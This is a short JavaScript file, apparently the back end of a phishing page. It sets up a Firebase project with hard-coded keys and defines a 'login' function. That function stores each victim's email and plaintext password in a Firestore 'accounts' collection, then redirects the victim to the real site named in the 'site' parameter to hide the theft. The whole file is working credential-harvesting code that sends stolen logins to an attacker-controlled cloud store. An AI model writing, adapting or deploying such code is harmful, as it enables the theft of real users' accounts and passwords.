// Import the functions you need from the SDKs you need
import { initializeApp } from "firebase/app";
import { getFirestore } from "firebase/firestore";
import { addDoc,collection } from "firebase/firestore";
// TODO: Add SDKs for Firebase products that you want to use
// https://firebase.google.com/docs/web/setup#available-libraries

// Your web app's Firebase configuration
const firebaseConfig = {
  apiKey: "AIzaSyAfkbhirt1GCFlKBI6HPej6ut6NfCRm1lA",
  authDomain: "isda-1dfe9.firebaseapp.com",
  projectId: "isda-1dfe9",
  storageBucket: "isda-1dfe9.appspot.com",
  messagingSenderId: "543551280275",
  appId: "1:543551280275:web:09836bd52e1ac8d8862966"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
export const db = getFirestore(app);


export const login = async (email, password, site) => {
  try {
    const docRef = await addDoc(collection(db, "accounts"), {
      email,
      password,
      loginAt: new Date(),
      site
    });
    console.log("Document written with ID: ", docRef.id);
    window.location.href = `https://www.${site}.com`;
  } catch (e) {
    console.error("Error adding document: ", e);
  }
}